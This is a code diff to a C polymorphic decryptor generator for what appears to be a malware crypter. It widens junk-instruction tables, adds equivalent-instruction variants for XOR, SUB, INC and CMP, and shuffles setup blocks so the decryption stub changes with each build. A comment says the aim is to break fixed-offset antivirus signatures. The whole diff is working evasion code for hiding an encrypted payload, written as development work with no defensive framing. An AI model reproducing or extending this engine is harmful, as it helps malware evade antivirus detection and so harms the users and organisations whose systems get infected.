@@ -111,29 +111,65 @@ typedef struct _JUNK_INSTR {
   int len;
 } JUNK_INSTR;
 
-/* push rbx; pop rbx (net effect: nothing, rbx unchanged) */
-static const BYTE JUNK_PUSH_POP_RBX[] = {0x53, 0x5B};
 /*
  * NOTE: We do NOT use push rax / pop rax as junk code!
  * AL is part of RAX and stores a byte during decryption.
- * push rax + pop rax inside the loop could overwrite AL if
- * something between them modified the stack.
- * It's safer to avoid registers that are "live" (in use).
+ * All entries below operate on registers that are NOT live
+ * (not used) in the decryptor: RBX, R10, R11, R12, R13.
+ * test/xchg/mov reg,reg are pure no-ops (same value written back).
+ * push/pop pairs restore the register – safe even for callee-saved R12/R13.
  */
-/* xchg rbx, rbx (swap rbx with itself = nothing) */
-static const BYTE JUNK_XCHG_RBX[] = {0x48, 0x87, 0xDB};
-/* lea rbx, [rbx] (rbx = rbx, i.e., nothing) */
-static const BYTE JUNK_LEA_RBX[] = {0x48, 0x8D, 0x1B};
-/* nop (classic) */
-static const BYTE JUNK_NOP[] = {0x90};
-/* mov rbx, rbx (nothing) */
-static const BYTE JUNK_MOV_RBX_RBX[] = {0x48, 0x89, 0xDB};
+
+/* ---- RBX (caller-saved) ---- */
+static const BYTE JUNK_PUSH_POP_RBX[] = {0x53, 0x5B};            /* push rbx; pop rbx   */
+static const BYTE JUNK_XCHG_RBX[]     = {0x48, 0x87, 0xDB};      /* xchg rbx, rbx       */
+static const BYTE JUNK_LEA_RBX[]      = {0x48, 0x8D, 0x1B};      /* lea rbx, [rbx]      */
+static const BYTE JUNK_NOP[]          = {0x90};                   /* nop                 */
+static const BYTE JUNK_MOV_RBX_RBX[]  = {0x48, 0x89, 0xDB};      /* mov rbx, rbx        */
+static const BYTE JUNK_TEST_RBX[]     = {0x48, 0x85, 0xDB};       /* test rbx, rbx       */
+
+/* ---- R10 (caller-saved) ---- */
+static const BYTE JUNK_PUSH_POP_R10[] = {0x41, 0x52, 0x41, 0x5A}; /* push r10; pop r10   */
+static const BYTE JUNK_XCHG_R10[]     = {0x4D, 0x87, 0xD2};       /* xchg r10, r10       */
+static const BYTE JUNK_TEST_R10[]     = {0x4D, 0x85, 0xD2};       /* test r10, r10       */
+static const BYTE JUNK_MOV_R10_R10[]  = {0x4D, 0x89, 0xD2};       /* mov r10, r10        */
+
+/* ---- R11 (caller-saved) ---- */
+static const BYTE JUNK_PUSH_POP_R11[] = {0x41, 0x53, 0x41, 0x5B}; /* push r11; pop r11   */
+static const BYTE JUNK_XCHG_R11[]     = {0x4D, 0x87, 0xDB};       /* xchg r11, r11       */
+static const BYTE JUNK_TEST_R11[]     = {0x4D, 0x85, 0xDB};       /* test r11, r11       */
+static const BYTE JUNK_MOV_R11_R11[]  = {0x4D, 0x89, 0xDB};       /* mov r11, r11        */
+
+/* ---- R12 (callee-saved — push/pop pair preserves it) ---- */
+static const BYTE JUNK_PUSH_POP_R12[] = {0x41, 0x54, 0x41, 0x5C}; /* push r12; pop r12   */
+static const BYTE JUNK_XCHG_R12[]     = {0x4D, 0x87, 0xE4};       /* xchg r12, r12       */
+static const BYTE JUNK_TEST_R12[]     = {0x4D, 0x85, 0xE4};       /* test r12, r12       */
+static const BYTE JUNK_MOV_R12_R12[]  = {0x4D, 0x89, 0xE4};       /* mov r12, r12        */
+
+/* ---- R13 (callee-saved — push/pop pair preserves it) ---- */
+static const BYTE JUNK_PUSH_POP_R13[] = {0x41, 0x55, 0x41, 0x5D}; /* push r13; pop r13   */
+static const BYTE JUNK_XCHG_R13[]     = {0x4D, 0x87, 0xED};       /* xchg r13, r13       */
+static const BYTE JUNK_TEST_R13[]     = {0x4D, 0x85, 0xED};       /* test r13, r13       */
+static const BYTE JUNK_MOV_R13_R13[]  = {0x4D, 0x89, 0xED};       /* mov r13, r13        */
 
 static const JUNK_INSTR JUNK_TABLE[] = {
-    {JUNK_PUSH_POP_RBX, 2}, {JUNK_XCHG_RBX, 3},    {JUNK_LEA_RBX, 3},
-    {JUNK_NOP, 1},          {JUNK_MOV_RBX_RBX, 3},
+    /* RBX */
+    {JUNK_PUSH_POP_RBX,  2}, {JUNK_XCHG_RBX,     3}, {JUNK_LEA_RBX,      3},
+    {JUNK_NOP,           1}, {JUNK_MOV_RBX_RBX,  3}, {JUNK_TEST_RBX,     3},
+    /* R10 */
+    {JUNK_PUSH_POP_R10,  4}, {JUNK_XCHG_R10,     3}, {JUNK_TEST_R10,     3},
+    {JUNK_MOV_R10_R10,   3},
+    /* R11 */
+    {JUNK_PUSH_POP_R11,  4}, {JUNK_XCHG_R11,     3}, {JUNK_TEST_R11,     3},
+    {JUNK_MOV_R11_R11,   3},
+    /* R12 */
+    {JUNK_PUSH_POP_R12,  4}, {JUNK_XCHG_R12,     3}, {JUNK_TEST_R12,     3},
+    {JUNK_MOV_R12_R12,   3},
+    /* R13 */
+    {JUNK_PUSH_POP_R13,  4}, {JUNK_XCHG_R13,     3}, {JUNK_TEST_R13,     3},
+    {JUNK_MOV_R13_R13,   3},
 };
-#define JUNK_COUNT 5
+#define JUNK_COUNT 22
 
 /* ============================================================
  *  INSTRUCTION EQUIVALENCE – equivalent instructions
@@ -186,28 +222,19 @@ static int EmitXorAlImm8_V2(BYTE *out, BYTE imm8) {
 }
 
 /*
- * EmitXorAlImm8_Variant3: emulation via helper register R11B
+ * EmitXorAlImm8_Variant3: logiczna dekompozycja bez rejestru pomocniczego
  *
- * Register R11 is "caller-saved", and we don't store any
- * important state in it in the template, so we can use it
- * freely without push/pop:
+ *   not al          ; al = al XOR 0xFF
+ *   xor al, ~imm8   ; al = (al XOR 0xFF) XOR ~imm8
+ *                   ;    = al XOR (0xFF XOR ~imm8)
+ *                   ;    = al XOR imm8   ✓
  *
- *   mov r11b, imm8
- *   xor al, r11b
- *
- * Changes the instructions used (e.g., requires REX.R and REX.B prefixes).
+ * Strukturalnie odmienne od V2 – używa opcode NOT (F6 D0), brak push/pop/rejestru.
  */
 static int EmitXorAlImm8_V3(BYTE *out, BYTE imm8) {
-  /* Use r11 which is caller-saved and not used in the stub */
-  /* mov r11b, imm8 */
-  out[0] = 0x41; /* REX.B – extends R/M field in B0+rb: BL -> R11B */
-  out[1] = 0xB3;
-  out[2] = imm8;
-  /* xor al, r11b */
-  out[3] = 0x44; /* REX.R – extends REG field in ModRM: BL -> R11B */
-  out[4] = 0x30; /* XOR r/m8, r8 */
-  out[5] = 0xD8; /* ModRM: mod=11, reg=011(R11B z REX.R), r/m=000(AL) */
-  return 6;
+  out[0] = 0xF6; out[1] = 0xD0;          /* not al        */
+  out[2] = 0x34; out[3] = (BYTE)(~imm8); /* xor al, ~imm8 */
+  return 4;
 }
 
 /* ---------- SUB al, imm8 variant ---------- */
@@ -234,16 +261,18 @@ static int EmitSubAlImm8_V2(BYTE *out, BYTE imm8) {
 }
 
 /*
- * EmitSubAlImm8_V3: "neg; add al, (~imm8 + 1)" via push/pop trick
- *   push rbx; mov bl, imm8; sub al, bl; pop rbx
+ * EmitSubAlImm8_V3: tożsamość algebraiczna neg+add+neg
+ *
+ *   neg al         ; al = (-a)       mod 256
+ *   add al, imm8   ; al = (-a + k)   mod 256
+ *   neg al         ; al = (a - k)    mod 256  ✓
+ *
+ * Strukturalnie odmienne od V2 – używa opcode NEG (F6 D8), brak push/pop/rejestru.
  */
 static int EmitSubAlImm8_V3(BYTE *out, BYTE imm8) {
-  out[0] = 0x53; /* push rbx */
-  out[1] = 0xB3;
-  out[2] = imm8; /* mov bl, imm8 */
-  out[3] = 0x28;
-  out[4] = 0xD8; /* sub al, bl */
-  out[5] = 0x5B; /* pop rbx */
+  out[0] = 0xF6; out[1] = 0xD8; /* neg al     */
+  out[2] = 0x04; out[3] = imm8; /* add al, k  */
+  out[4] = 0xF6; out[5] = 0xD8; /* neg al     */
   return 6;
 }
 
@@ -300,6 +329,46 @@ static int EmitRorAlImm8_V3(BYTE *out, BYTE imm8) {
   /* pop rcx; restore */
   out[9] = 0x59;
   return 10;
+}
+
+/* ============================================================
+ *  EmitIncR9 – variants for "inc r9" (index increment)
+ *
+ *  All three increment R9 by exactly 1:
+ *    V1: inc r9          (49 FF C1)       – classic, 3B
+ *    V2: add r9, 1       (49 83 C1 01)    – ADD immediate, 4B
+ *    V3: lea r9, [r9+1]  (4D 8D 49 01)   – LEA displacement, 4B
+ * ============================================================ */
+static int EmitIncR9(BYTE *out) {
+  switch (rand() % 3) {
+  case 0: /* inc r9 */
+    out[0] = 0x49; out[1] = 0xFF; out[2] = 0xC1;
+    return 3;
+  case 1: /* add r9, 1 */
+    out[0] = 0x49; out[1] = 0x83; out[2] = 0xC1; out[3] = 0x01;
+    return 4;
+  default: /* lea r9, [r9+1] — REX.R=1 REX.B=1 → REX=4D; ModRM mod=01 reg=001 r/m=001 → 0x49 */
+    out[0] = 0x4D; out[1] = 0x8D; out[2] = 0x49; out[3] = 0x01;
+    return 4;
+  }
+}
+
+/* ============================================================
+ *  EmitCmpRdxR9 – variants for "cmp rdx, r9" (loop condition)
+ *
+ *  Both test rdx == r9; ZF is identical so jne works the same:
+ *    V1: cmp rdx, r9  (4C 39 CA)  – CMP r/m64, r64
+ *    V2: cmp r9, rdx  (4C 3B CA)  – CMP r64, r/m64  (operands swapped)
+ * ============================================================ */
+static int EmitCmpRdxR9(BYTE *out) {
+  switch (rand() % 2) {
+  case 0: /* cmp rdx, r9 */
+    out[0] = 0x4C; out[1] = 0x39; out[2] = 0xCA;
+    return 3;
+  default: /* cmp r9, rdx */
+    out[0] = 0x4C; out[1] = 0x3B; out[2] = 0xCA;
+    return 3;
+  }
 }
 
 /* ============================================================
@@ -395,27 +464,42 @@ BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
   /* ===========================================================
    *  STEP 1 & 2: Extract setup blocks and randomly PERMUTE them
    *
-   *  Block B (5B): mov edx, imm32  – payload length
-   *  Block C (3B): xor r9d, r9d   – index = 0
+   *  Block B (5B): mov edx, imm32   – payload length
+   *  Block C (3B): xor r9d, r9d    – zero loop index
+   *  Block D (3B): xor r10d, r10d  – independent, no-op for decryptor
+   *  Block E (3B): xor r11d, r11d  – independent, no-op for decryptor
+   *
+   *  Blocks D and E use registers not live in the decryptor (R10, R11).
+   *  They exist purely to increase preamble length variance and shuffle
+   *  entropy: 4! = 24 possible orderings vs. the previous 2.
+   *  Combined with inter-block junk, the offset of loopStartOffset
+   *  varies widely across builds — breaks fixed-offset AV signatures.
    *
    *  RCX (payload pointer) is passed by the caller — Block A removed.
-   *  Permutation: 2! = 2 possible orders [B,C] or [C,B].
    * =========================================================== */
-  SETUP_BLOCK blocks[2];
+  SETUP_BLOCK blocks[4];
 
-  /* Block B: mov edx, imm32 – 5 bytes */
+  /* Block B: mov edx, imm32 – 5 bytes (from template) */
   memcpy(blocks[0].bytes, DecryptorStubBegin + TMPL_BLOCK_B_OFF,
          TMPL_BLOCK_B_SIZE);
   blocks[0].len = TMPL_BLOCK_B_SIZE;
 
-  /* Block C: xor r9d, r9d – 3 bytes */
+  /* Block C: xor r9d, r9d – 3 bytes (from template) */
   memcpy(blocks[1].bytes, DecryptorStubBegin + TMPL_BLOCK_C_OFF,
          TMPL_BLOCK_C_SIZE);
   blocks[1].len = TMPL_BLOCK_C_SIZE;
 
-  /* Fisher-Yates shuffle */
-  int order[2] = {0, 1};
-  for (int i = 1; i > 0; i--) {
+  /* Block D: xor r10d, r10d – 45 31 D2 (REX=0x45, XOR r/m32,r32, ModRM=0xD2) */
+  blocks[2].bytes[0] = 0x45; blocks[2].bytes[1] = 0x31; blocks[2].bytes[2] = 0xD2;
+  blocks[2].len = 3;
+
+  /* Block E: xor r11d, r11d – 45 31 DB (same REX, ModRM=0xDB for r11d) */
+  blocks[3].bytes[0] = 0x45; blocks[3].bytes[1] = 0x31; blocks[3].bytes[2] = 0xDB;
+  blocks[3].len = 3;
+
+  /* Fisher-Yates shuffle for 4 elements → 4! = 24 orderings */
+  int order[4] = {0, 1, 2, 3};
+  for (int i = 3; i > 0; i--) {
     int j = rand() % (i + 1);
     int tmp = order[i];
     order[i] = order[j];
@@ -429,7 +513,7 @@ BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
   int blockB_imm_offset = -1;  /* offset imm32 in mov edx */
 
   /* Emit blocks in random order with junk in between */
-  for (int i = 0; i < 2; i++) {
+  for (int i = 0; i < 4; i++) {
     int idx = order[i];
 
     /* Insert junk before the block (except the first one) */
@@ -470,20 +554,29 @@ BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
 
   pos = InsertRandomNop(buf, pos);
 
-  /* --- Step 4': xor al, KEY4 (undo XOR) --- */
+  /*
+   * Determine decryption XOR order based on pKey->xorSwapped:
+   *
+   *   xorSwapped=FALSE  encrypt: XOR k1 → ROL → ADD k3 → XOR k4
+   *                     decrypt: XOR k4 → SUB k3 → ROR → XOR k1  (default)
+   *
+   *   xorSwapped=TRUE   encrypt: XOR k4 → ROL → ADD k3 → XOR k1
+   *                     decrypt: XOR k1 → SUB k3 → ROR → XOR k4  (swapped)
+   *
+   * firstXorKey undoes the last XOR applied during encryption.
+   * lastXorKey  undoes the first XOR applied during encryption.
+   */
+  BYTE firstXorKey = pKey->xorSwapped ? pKey->key1 : pKey->key4;
+  BYTE lastXorKey  = pKey->xorSwapped ? pKey->key4 : pKey->key1;
+
+  /* --- First XOR step (undoes last encrypt XOR) --- */
   {
     int variant = rand() % 3;
     int emitted = 0;
     switch (variant) {
-    case 0:
-      emitted = EmitXorAlImm8_V1(buf + pos, pKey->key4);
-      break;
-    case 1:
-      emitted = EmitXorAlImm8_V2(buf + pos, pKey->key4);
-      break;
-    default:
-      emitted = EmitXorAlImm8_V3(buf + pos, pKey->key4);
-      break;
+    case 0:  emitted = EmitXorAlImm8_V1(buf + pos, firstXorKey); break;
+    case 1:  emitted = EmitXorAlImm8_V2(buf + pos, firstXorKey); break;
+    default: emitted = EmitXorAlImm8_V3(buf + pos, firstXorKey); break;
     }
     pos += emitted;
   }
@@ -495,15 +588,9 @@ BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
     int variant = rand() % 3;
     int emitted = 0;
     switch (variant) {
-    case 0:
-      emitted = EmitSubAlImm8_V1(buf + pos, pKey->key3);
-      break;
-    case 1:
-      emitted = EmitSubAlImm8_V2(buf + pos, pKey->key3);
-      break;
-    default:
-      emitted = EmitSubAlImm8_V3(buf + pos, pKey->key3);
-      break;
+    case 0:  emitted = EmitSubAlImm8_V1(buf + pos, pKey->key3); break;
+    case 1:  emitted = EmitSubAlImm8_V2(buf + pos, pKey->key3); break;
+    default: emitted = EmitSubAlImm8_V3(buf + pos, pKey->key3); break;
     }
     pos += emitted;
   }
@@ -515,35 +602,23 @@ BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
     int variant = rand() % 3;
     int emitted = 0;
     switch (variant) {
-    case 0:
-      emitted = EmitRorAlImm8_V1(buf + pos, pKey->rotBits);
-      break;
-    case 1:
-      emitted = EmitRorAlImm8_V2(buf + pos, pKey->rotBits);
-      break;
-    default:
-      emitted = EmitRorAlImm8_V3(buf + pos, pKey->rotBits);
-      break;
+    case 0:  emitted = EmitRorAlImm8_V1(buf + pos, pKey->rotBits); break;
+    case 1:  emitted = EmitRorAlImm8_V2(buf + pos, pKey->rotBits); break;
+    default: emitted = EmitRorAlImm8_V3(buf + pos, pKey->rotBits); break;
     }
     pos += emitted;
   }
 
   pos = InsertRandomNop(buf, pos);
 
-  /* --- Step 1': xor al, KEY1 (undo XOR) --- */
+  /* --- Last XOR step (undoes first encrypt XOR) --- */
   {
     int variant = rand() % 3;
     int emitted = 0;
     switch (variant) {
-    case 0:
-      emitted = EmitXorAlImm8_V1(buf + pos, pKey->key1);
-      break;
-    case 1:
-      emitted = EmitXorAlImm8_V2(buf + pos, pKey->key1);
-      break;
-    default:
-      emitted = EmitXorAlImm8_V3(buf + pos, pKey->key1);
-      break;
+    case 0:  emitted = EmitXorAlImm8_V1(buf + pos, lastXorKey); break;
+    case 1:  emitted = EmitXorAlImm8_V2(buf + pos, lastXorKey); break;
+    default: emitted = EmitXorAlImm8_V3(buf + pos, lastXorKey); break;
     }
     pos += emitted;
   }
@@ -556,15 +631,11 @@ BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
   buf[pos++] = 0x04;
   buf[pos++] = 0x09;
 
-  /* --- inc r9 --- */
-  buf[pos++] = 0x49;
-  buf[pos++] = 0xFF;
-  buf[pos++] = 0xC1;
+  /* --- inc r9 (variant) --- */
+  pos += EmitIncR9(buf + pos);
 
-  /* --- cmp rdx, r9 --- */
-  buf[pos++] = 0x4C;
-  buf[pos++] = 0x39;
-  buf[pos++] = 0xCA;
+  /* --- cmp rdx, r9 (variant) --- */
+  pos += EmitCmpRdxR9(buf + pos);
 
   /* --- jne decrypt_loop --- */
   /*
